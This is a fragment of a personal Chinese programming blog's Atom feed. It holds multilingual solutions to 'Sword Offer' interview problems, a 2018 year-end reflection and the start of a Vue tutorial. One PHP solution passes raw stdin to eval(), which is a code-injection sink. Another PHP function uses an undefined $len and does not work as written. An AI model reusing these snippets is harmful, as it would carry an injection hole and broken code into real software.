&lt;/div&gt;</content><author><name>zrg</name></author><category term="Data-Structure" /><category term="Algorithms" /><summary type="html">1 数据结构和算法目录 首先明确一点：程序=数据结构+算法</summary></entry><entry><title type="html">剑指 Offer</title><link href="http://localhost:4000/algorithms/2019/02/12/offer/" rel="alternate" type="text/html" title="剑指 Offer" /><published>2019-02-12T00:00:00+08:00</published><updated>2019-02-12T00:00:00+08:00</updated><id>http://localhost:4000/algorithms/2019/02/12/offer</id><content type="html" xml:base="http://localhost:4000/algorithms/2019/02/12/offer/">&lt;div id=&quot;outline-container-org5f7c8ea&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org5f7c8ea&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 前言&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;本文内容是《剑指 Offer》的问题求解整理，使其文档化，主要包括问题的代码编写（主流语言）和思路分析。&lt;/li&gt;
&lt;li&gt;文章结构按照10小题为一章节来划分，每一小题的编程语言的实现一般按照【低级语言》脚本语言》高级语言】的格式来展示。&lt;/li&gt;
&lt;li&gt;引用别人的一句话“我们不生产代码，我们是代码的搬运工”。&lt;/li&gt;
&lt;li&gt;文章内容仅供参考。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org08c02c2&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org08c02c2&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 1~10&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;二维数组的查找
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-C++&quot; id=&quot;org0002e4e&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;orgdecbb34&quot;&gt;   &amp;lt;?php

function Find($target, $array)
{
    foreach($array as $key=&amp;gt;$val){
        if(in_array($target,$val)){
            return &lt;span style=&quot;color: #ffd866;&quot;&gt;&quot;true&quot;&lt;/span&gt;&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
        }
    }
    return &lt;span style=&quot;color: #ffd866;&quot;&gt;&quot;false&quot;&lt;/span&gt;&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
}
while(fscanf(STDIN,&lt;span style=&quot;color: #ffd866;&quot;&gt;&quot;%d,%s&quot;&lt;/span&gt;,$a,$b) == 2){
    $target = $a&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    eval('$array='.$b.'&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;');&lt;/span&gt;
    try{
        echo Find($target,$array).&lt;span style=&quot;color: #ffd866;&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    }catch(Exception $e){
        die&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-java&quot; id=&quot;orge77fbb9&quot;&gt;   &lt;span style=&quot;color: #ff6188;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #ff6188;&quot;&gt;class&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;Solution&lt;/span&gt; {
    &lt;span style=&quot;color: #ff6188;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;boolean&lt;/span&gt; &lt;span style=&quot;color: #a9dc76;&quot;&gt;Find&lt;/span&gt;(&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;target&lt;/span&gt;, &lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; [][] &lt;span style=&quot;color: #fcfcfa;&quot;&gt;array&lt;/span&gt;) {
        &lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;rows&lt;/span&gt; = array.length;
        &lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;cols&lt;/span&gt; = array[0].length;
        &lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;=rows-1,&lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;=0;
        &lt;span style=&quot;color: #ff6188;&quot;&gt;while&lt;/span&gt;(i&amp;gt;=0 &amp;amp;&amp;amp; j&amp;lt;&lt;span style=&quot;color: #78dce8;&quot;&gt;cols&lt;/span&gt;){
            &lt;span style=&quot;color: #ff6188;&quot;&gt;if&lt;/span&gt;(target&amp;lt;&lt;span style=&quot;color: #78dce8;&quot;&gt;array&lt;/span&gt;[i][j])
                i--;
            &lt;span style=&quot;color: #ff6188;&quot;&gt;else&lt;/span&gt; &lt;span style=&quot;color: #ff6188;&quot;&gt;if&lt;/span&gt;(target&amp;gt;array[i][j])
                j++;
            &lt;span style=&quot;color: #ff6188;&quot;&gt;else&lt;/span&gt;
                &lt;span style=&quot;color: #ff6188;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #ab9df2;&quot;&gt;true&lt;/span&gt;;
        }
        &lt;span style=&quot;color: #ff6188;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #ab9df2;&quot;&gt;false&lt;/span&gt;;
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-python&quot; id=&quot;org3b2a4de&quot;&gt;&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;-*- coding:utf-8 -*-&lt;/span&gt;
&lt;span style=&quot;color: #ff6188;&quot;&gt;class&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;Solution&lt;/span&gt;:
 &lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;array &amp;#20108;&amp;#32500;&amp;#21015;&amp;#34920;&lt;/span&gt;
 &lt;span style=&quot;color: #ff6188;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color: #a9dc76;&quot;&gt;Find&lt;/span&gt;(&lt;span style=&quot;color: #ff6188;&quot;&gt;self&lt;/span&gt;, target, array):
     &lt;span style=&quot;color: #fcfcfa;&quot;&gt;rows&lt;/span&gt;=&lt;span style=&quot;color: #ab9df2;&quot;&gt;len&lt;/span&gt;(array)
     &lt;span style=&quot;color: #fcfcfa;&quot;&gt;cols&lt;/span&gt;=&lt;span style=&quot;color: #ab9df2;&quot;&gt;len&lt;/span&gt;(array[0])
     &lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;=rows-1
     &lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;=0
     &lt;span style=&quot;color: #ff6188;&quot;&gt;while&lt;/span&gt; i&amp;gt;=0 &lt;span style=&quot;color: #ff6188;&quot;&gt;and&lt;/span&gt; j&amp;lt;cols:
         &lt;span style=&quot;color: #ff6188;&quot;&gt;if&lt;/span&gt; target&amp;lt;array[i][j]:
             &lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt; -= 1
         &lt;span style=&quot;color: #ff6188;&quot;&gt;elif&lt;/span&gt; target&amp;gt;array[i][j]:
             &lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt; += 1
         &lt;span style=&quot;color: #ff6188;&quot;&gt;else&lt;/span&gt;:
             &lt;span style=&quot;color: #ff6188;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #ab9df2;&quot;&gt;True&lt;/span&gt;
     &lt;span style=&quot;color: #ff6188;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #ab9df2;&quot;&gt;False&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;orgfb85e0c&quot;&gt;   class Solution
{
    public bool Find(int target, int[][] array)
    {
        int row=0&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
        int col=array[0].Length-1&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
        while(row&amp;lt;=array.Length-1&amp;amp;&amp;amp;col&amp;gt;=0){
            if(target==array[row][col])
                return true&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
            else if(target&amp;gt;array[row][col])
                row++&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
            else
                col--&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
        }
        return false&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;

    }
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;
矩阵是有序的，从左下角来看，向上数字递减，向右数字递增，因此从左下角开始查找，当要查找数字比左下角数字大时。右移要查找数字比左下角数字小时，上移。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;替换空格
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org8a2e072&quot;&gt;   &amp;lt;?php
// &amp;#30452;&amp;#25509;&amp;#20351;&amp;#29992;&amp;#20989;&amp;#25968;
function replaceSpace($str)
{
    return str_replace(' ','%20',$str)&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
}
// &amp;#19981;&amp;#20801;&amp;#35768;&amp;#30452;&amp;#25509;&amp;#35843;&amp;#29992;&amp;#20869;&amp;#32622;&amp;#20989;&amp;#25968;
&amp;lt;?php
function replaceSpace($str)
{
    $res = ''&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    $strLength = strlen($str)&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    for($i=0&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;$i&amp;lt;$len;$i++){&lt;/span&gt;
        if($str[$i]==' '){
                $res .='%20'&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
        }else{
                $res .=$str[$i]&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
        }
    }
    return $res&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;问题1：替换字符串，是在原来的字符串上做替换，还是新开辟一个字符串做替换！&lt;/li&gt;
&lt;li&gt;问题2：在当前字符串替换，怎么替换才更有效率（不考虑内置的replace方法）。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;从前往后替换，后面的字符要不断往后移动，要多次移动，所以效率低下&lt;/li&gt;
&lt;li&gt;从后往前，先计算需要多少空间，然后从后往前移动，则每个字符只为移动一次，这样效率更高一点。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;从尾到头打印链表
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
输入一个链表，按链表值从尾到头的顺序返回一个ArrayList。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;orgf3557d0&quot;&gt;     &amp;lt;?php

/*class ListNode{
    var $val&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    var $next = NULL&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    function __construct($x){
        $this-&amp;gt;val = $x&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    }
}*/
function printListFromTailToHead($head)
{
    $arrayList = []&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    while($head !== null){
        $arrayList[]=$head-&amp;gt;val&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
        $head=$head-&amp;gt;next&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    }
    return array_reverse($arrayList)&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;
有三种思路，
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一就是利用栈先入后出的特性完成；&lt;/li&gt;
&lt;li&gt;第二就是存下来然后进行数组翻转；&lt;/li&gt;
&lt;li&gt;第三是利用递归。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;重建二叉树
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org98b32e8&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org29b3a7a&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org29b3a7a&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 11~20&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-org54730dd&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org54730dd&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; 21~30&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="剑指-Offer" /><summary type="html">1 前言 本文内容是《剑指 Offer》的问题求解整理，使其文档化，主要包括问题的代码编写（主流语言）和思路分析。 文章结构按照10小题为一章节来划分，每一小题的编程语言的实现一般按照【低级语言》脚本语言》高级语言】的格式来展示。 引用别人的一句话“我们不生产代码，我们是代码的搬运工”。 文章内容仅供参考。 2 1~10 二维数组的查找 题目描述 在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</summary></entry><entry><title type="html">总结2018，展望2019</title><link href="http://localhost:4000/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/2019/01/17/%E6%80%BB%E7%BB%932018-%E5%B1%95%E6%9C%9B2019/" rel="alternate" type="text/html" title="总结2018，展望2019" /><published>2019-01-17T00:00:00+08:00</published><updated>2019-01-17T00:00:00+08:00</updated><id>http://localhost:4000/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/2019/01/17/%E6%80%BB%E7%BB%932018-%E5%B1%95%E6%9C%9B2019</id><content type="html" xml:base="http://localhost:4000/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/2019/01/17/%E6%80%BB%E7%BB%932018-%E5%B1%95%E6%9C%9B2019/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org4a762db&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org4a762db&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 喜乐哀愁的2018&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org606f5be&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org606f5be&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 大事记&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
失业21天
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
继2017年12月31号从上家公司辞职后，于2018年1月22日入职现在的公司，当时也算为徘徊了半个多月的自己找到了归宿。
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
大雨过后的车祸
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年3月3日20点35分，在二环快速B线（北）下高架桥的时候，自己驾驶的一辆共享汽车追尾了一辆起亚k3的小汽车，回头想了想，还是觉得离老司机的路尚远。后续赔付了4000多块，事情得以终结。
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
公司辞职潮
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年4月，所在部门掀起了一批辞职潮，个中缘由在这就不细说了！对于一个刚转正，继续回血的新人来说，实在是说不清楚的。\\
由于4月份、5月份部门内辞职了一大批核心技术人员，致使很多工作压到了我这里，倍感极具挑战性。入职4个月，从中也学到了很多之前没有接触的新知识，这点很欣慰，继续加油！！！
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
搭建个人博客
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年7月3日，在 Github 上使用 Jekyll 搭建了自己的 Blog，从此提醒自己记录开发笔记。
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
新项目
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年11月，被编入了一个新项目（政府项目），在该项目中技术上没学到什么，不过在其他方面算是“受益匪浅”吧。，项目还在继续，在这就不细说了
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
外公过逝
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2018年12月15日，外公过逝了，我是晚上19点多接到父亲电话的，之后联系了表妹、姨兄，本欲赶往参加葬礼，后面被父亲劝住了。\\
父亲说了一句话：活着的时候你已多孝，死了不不能前来也不会怎么样！也就是那句话吧！【生前早尽孝,莫待人老空哭坟】
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org16ead5f&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org16ead5f&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 总结&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;如果说要给 2018 年做一个总结的话，那就是两个字：不顺。按说，2017年是本命年，应该才是不顺的一年，也许本命年过度到 2018 了吧！&lt;/li&gt;
&lt;li&gt;期待 2019 年顺顺利利吧！不管工作、生活、学习都能有所进步。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc7348d5&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgc7348d5&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 期待新未来2019&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge1ec84c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge1ec84c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 未来展望&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
一起回想和展望
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
2019年1月6-7日，和大学同学（老蒋，超哥，礼杰，我）聊了好久，说了很多！回想了在学校时的想法，回顾了从毕业到现在的种种，尤感岁月蹉跎，一眨眼2年半过去了，最后各自说了自己未来3年的计划。\\
这次相互间的交流让我感到了一股压力，让我不得不再次思考要不要驻留昆明，如果留昆明，那就意味着要买房，我一直是一个崇尚自由的人，不想被绑架，但父母又希望我能回老家某个职位，我有点不知所措。
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
新的一年，新的方向
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
进一步提高职业技能，掌握专长技能，总结并构建技能框架，积累工作经验。
进一步学习，保留原有的常规学习内容：汉字书写练习、英语口语加强、专业知识积累。新技术学习也很重要，不能固步自封，向前看。
生活上，提高情商吧！女朋友一直说我情商低，是时候给自己定个小目标了！
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org14ce206&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org14ce206&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 小小心愿&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;工作技能提升，排在第一位一直都是很有必要的。&lt;/li&gt;
&lt;li&gt;找一份合适自己的工作很重要。&lt;/li&gt;
&lt;li&gt;升职加薪，当然是 2019 年追求的终极目标，毕竟有余力才能创造更多的东西，不管是工作还是生活上。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="年终总结" /><category term="未来展望" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">vue实例属性之el-template-render</title><link href="http://localhost:4000/javascript/2018/12/29/vue%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7%E4%B9%8Bel_template_render/" rel="alternate" type="text/html" title="vue实例属性之el-template-render" /><published>2018-12-29T00:00:00+08:00</published><updated>2018-12-29T00:00:00+08:00</updated><id>http://localhost:4000/javascript/2018/12/29/vue%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7%E4%B9%8Bel_template_render</id><content type="html" xml:base="http://localhost:4000/javascript/2018/12/29/vue%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7%E4%B9%8Bel_template_render/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-orgfe9c9ce&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgfe9c9ce&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 优先级&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/vue-level.png&quot; alt=&quot;vue-level.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-org9eebc63&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9eebc63&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 优先级-示例&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org921b2d9&quot;&gt;&amp;lt;div class=&lt;span style=&quot;color: #ffd866;&quot;&gt;&quot;vapp-1&quot;&lt;/span&gt;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;div class=&lt;span style=&quot;color: #ffd866;&quot;&gt;&quot;vapp-2&quot;&lt;/span&gt;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;div class=&lt;span style=&quot;color: #ffd866;&quot;&gt;&quot;vapp-3&quot;&lt;/span&gt;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;orgd6e0594&quot;&gt;&lt;span style=&quot;color: #ff6188;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #ffd866;&quot;&gt;'.vapp-1'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #ffd866;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  },
